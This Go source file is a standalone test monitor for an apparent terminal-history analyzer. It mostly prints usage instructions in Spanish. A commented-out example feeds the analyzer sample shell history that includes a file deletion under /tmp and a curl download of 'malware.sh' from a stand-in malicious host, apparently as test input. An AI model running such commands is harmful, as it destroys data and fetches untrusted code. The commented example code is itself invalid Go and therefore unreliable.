package main

import (
	"fmt"
	"log"
)

// Este es el monitor standalone para pruebas
// No se ejecuta automáticamente, solo para testing del monitor

func main() {
	fmt.Println("=== MONITOR STANDALONE DE PRUEBA ===")
	fmt.Println("Este monitor es solo para probar las funciones de monitoreo")
	fmt.Println("El monitoreo real se ejecuta automáticamente cuando haces peticiones al servidor")
	fmt.Println()
	fmt.Println("Para usar el monitoreo real:")
	fmt.Println("1. Ejecuta tu servidor: go run cmd/server/main.go")
	fmt.Println("2. Haz peticiones desde tu frontend")
	fmt.Println("3. Ve los reportes en la consola del servidor")
	fmt.Println()
	fmt.Println("Para ver este archivo en acción, puedes comentar este mensaje")
	fmt.Println("y descomentar el código de ejemplo abajo.")

	// Código de ejemplo comentado - descomenta para probar
	/*
			import "terminal-history-analyzer/internal/monitor"

			mon := monitor.NewMonitor()

			// Simular análisis
			content := `cd /home/user
		ls -la
		sudo rm -rf /tmp/*
		curl -o malware.sh http://malicious.com/script.sh
		ssh root@192.168.1.100`

			fmt.Printf("📋 Analizando historial de terminal (%d caracteres)\n", len(content))
			fmt.Println("="*60)

			// Simular fases
			lexMetric := mon.StartPhase("LÉXICO")
			time.Sleep(50 * time.Millisecond)
			mon.EndPhase(lexMetric)

			parseMetric := mon.StartPhase("SINTÁCTICO")
			time.Sleep(30 * time.Millisecond)
			mon.EndPhase(parseMetric)

			semanticMetric := mon.StartPhase("SEMÁNTICO")
			time.Sleep(80 * time.Millisecond)
			mon.EndPhase(semanticMetric)

			mon.FinishAnalysis()
	*/

	log.Println("Monitor standalone finalizado")
}
